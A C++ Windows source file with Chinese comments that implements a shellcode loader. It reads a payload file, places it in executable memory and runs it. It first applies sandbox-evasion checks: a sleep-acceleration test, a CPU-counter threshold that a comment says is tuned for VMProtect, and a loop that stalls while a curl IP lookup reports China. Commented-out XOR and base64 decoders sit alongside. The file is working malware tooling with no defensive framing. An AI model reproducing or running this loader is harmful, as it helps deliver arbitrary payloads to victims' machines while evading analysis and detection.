#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <numeric>
#include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <sstream>  
#include <iostream>
#include <cstdlib>
#include <string>
#include <memory>
#include <stdexcept>
#include <array>
#include <windows.h>
#include <fstream>
#include <cstring>
#include <iostream>
using namespace std;

void isTimeAccelerated() {
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    while (duration.count() < 5000) {
        std::cout << "F" << std::endl;

        double* pvalue = NULL; // 初始化为 null 的指针
        pvalue = new double;   // 为变量请求内存

        *pvalue = 29494.99;     // 在分配的地址存储值

        delete pvalue;         // 释放内存
    }
}

void ddt() {
    using namespace std::chrono;

    // 初始变量
    int counter = 1;

    // 获取当前时间点
    auto start_time = high_resolution_clock::now();

    // 持续加1直到5秒过去
    while (true) {
        // 获取当前时间
        auto current_time = high_resolution_clock::now();

        // 计算过去的时间
        auto duration = duration_cast<seconds>(current_time - start_time);

        // 如果5秒已经过去，则退出循环
        if (duration.count() >= 5) {
            break;
        }

        // 增加变量
        counter++;
    }

    // 输出结果
    //std::cout << "在5秒内，变量从1增加到：" << counter << std::endl;
    std::cout << counter << std::endl;

    //while (counter < 90000000) {
    //0.9亿是没有使用vmp的,3万是给使用vmp的
    while (counter < 30000) {
        std::cout << "D" << std::endl;

        double* pvalue = NULL; // 初始化为 null 的指针
        pvalue = new double;   // 为变量请求内存

        *pvalue = 29494.99;     // 在分配的地址存储值

        delete pvalue;         // 释放内存

        //Sleep(1);
    }
    return ;
}

void ip() {
    while (true) {

        // 执行 curl 命令，并获取输出
        const char* cmd = "curl -s https://myip.ipip.net/";

        // 将 char* 转换为 wchar_t*（使用安全函数 mbstowcs_s）
        size_t cmdLength = strlen(cmd) + 1;
        std::wstring wCmd(cmdLength, L'\0');
        size_t convertedChars = 0;

        // 使用 mbstowcs_s 转换 char* 到 wchar_t*
        errno_t err = mbstowcs_s(&convertedChars, &wCmd[0], wCmd.size(), cmd, cmdLength);
        if (err != 0) {
            std::cerr << "Error converting char* to wchar_t*.\n";
            return;
        }

        // 设置命令行的输出缓冲区
        std::array<char, 128> buffer;
        std::string result;

        // 通过 CreateProcess 执行命令
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.lpSecurityDescriptor = NULL;
        saAttr.bInheritHandle = TRUE;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
            std::cerr << "Failed to create pipe\n";
            return;
        }

        PROCESS_INFORMATION piProcInfo;
        STARTUPINFO siStartInfo;
        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdOutput = hWritePipe;
        siStartInfo.hStdError = hWritePipe;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        // 创建进程，使用宽字符版本的 CreateProcessW
        if (!CreateProcessW(NULL, &wCmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
            std::cerr << "CreateProcess failed\n";
            return;
        }

        // 关闭写管道
        CloseHandle(hWritePipe);

        // 读取命令的输出
        DWORD dwRead;
        char szBuffer[4096];
        while (true) {
            if (!ReadFile(hReadPipe, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL) || dwRead == 0)
                break;
            szBuffer[dwRead] = '\0';  // 确保读取的数据是以 \0 结束的字符串
            result += szBuffer;
        }

        // 等待进程结束
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);

        // 关闭句柄
        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        // 检查输出内容中是否包含 "中国"
        if (result.find("中国") == std::string::npos) {
            break;
        }

        using namespace std::chrono;

        // 获取当前时间点
        auto start_time = high_resolution_clock::now();

        while (true) {
            // 获取当前时间
            auto current_time = high_resolution_clock::now();

            // 计算过去的时间
            auto duration = duration_cast<seconds>(current_time - start_time);

            // 如果3秒已经过去，则退出循环
            if (duration.count() >= 3) {
                break;
            }
        }
    }
}

//int decryptKey(int diff, int minValue, int maxValue) {

  //  for (int num = minValue; num <= maxValue; num++) {

    //    int randomValue = diff + num;

      //  if (520519 < randomValue && randomValue < 520521) {
        //    return randomValue;
        //}
    //}

//}

//std::string xorDecrypt(const std::string& data, const std::string& key) {

  //  std::string decryptedData;
    //for (std::size_t i = 0; i < data.length(); ++i) {
      //  decryptedData += data[i] ^ key[i % key.length()];
    //}
    //return decryptedData;
//}


//void RingQ(const std::string& file_path) {
//
  //  const char* filePath = "main.txt"; // 你的 shellcode 文件路径
  //  std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);


    // 获取文件大小
 //   std::streamsize byte_sequence_length = shellcodeFile.tellg();
 //   shellcodeFile.seekg(0, std::ios::beg);

    // 分配内存并读取文件内容到内存中
//    char* byte_sequence = new char[byte_sequence_length];

    // 分配可执行内存
//    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 将文件内容拷贝到分配的内存
  //  memcpy(execMemory, byte_sequence, byte_sequence_length);
 //   delete[] byte_sequence;

    // 将内存地址转换为函数指针
    //typedef void (*ShellcodeFunc)();
   // ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // 执行 shellcode
    //shellcodeFunc();

    // 释放分配的内存
    //VirtualFree(execMemory, 0, MEM_RELEASE);

//}

// Base64 解码函数
//std::vector<unsigned char> base64_decode(const std::string& in) {
  //  std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    //size_t len = in.size();
    //size_t padding = 0;
   // if (len > 1 && in[len - 1] == '=') padding++;
    //if (len > 2 && in[len - 2] == '=') padding++;

    //size_t decoded_size = (len * 3) / 4 - padding;
   // std::vector<unsigned char> decoded_data(decoded_size);

    //int val = 0, valb = -8;
   // size_t j = 0;

 //   for (size_t i = 0; i < len; ++i) {
   //     char c = in[i];
     //   if (c == '=' || base64_chars.find(c) == std::string::npos) continue;

//        val = (val << 6) + base64_chars.find(c);
  //      valb += 6;
    //    if (valb >= 0) {
      //      decoded_data[j++] = (val >> valb) & 0xFF;
        //    valb -= 8;
        //}
//    }
  //  return decoded_data;
//}

int main(int argc, char* argv[]) {

    if (argc != 3 || std::strcmp(argv[1], "-file") != 0) {
        return -1;
    }

    isTimeAccelerated();
    ddt();
    ip();
    //std::string file_path = "main.txt";
    //RingQ(file_path);

    // 检查命令行参数

    // 获取 shellcode 文件路径
    const char* filePath = argv[2];
    std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);

    if (!shellcodeFile.is_open()) {
        //std::cerr << "Failed to open shellcode file: " << filePath << std::endl;
        return -1;
    }

    // 获取文件大小
    std::streamsize byte_sequence_length = shellcodeFile.tellg();
    shellcodeFile.seekg(0, std::ios::beg);

    // 分配内存并读取文件内容到内存中
    char* byte_sequence = new char[byte_sequence_length];
    if (!shellcodeFile.read(byte_sequence, byte_sequence_length)) {
        //std::cerr << "Failed to read shellcode from file: " << filePath << std::endl;
        delete[] byte_sequence;
        return -1;
    }

    // 分配可执行内存
    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        //std::cerr << "Failed to allocate memory." << std::endl;
        delete[] byte_sequence;
        return -1;
    }

    // 将文件内容拷贝到分配的内存
    memcpy(execMemory, byte_sequence, byte_sequence_length);
    //delete[] byte_sequence;

    // 将内存地址转换为函数指针
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // 执行 shellcode
    shellcodeFunc();

    // 释放分配的内存
    VirtualFree(execMemory, 0, MEM_RELEASE);

    //system("pause");
}
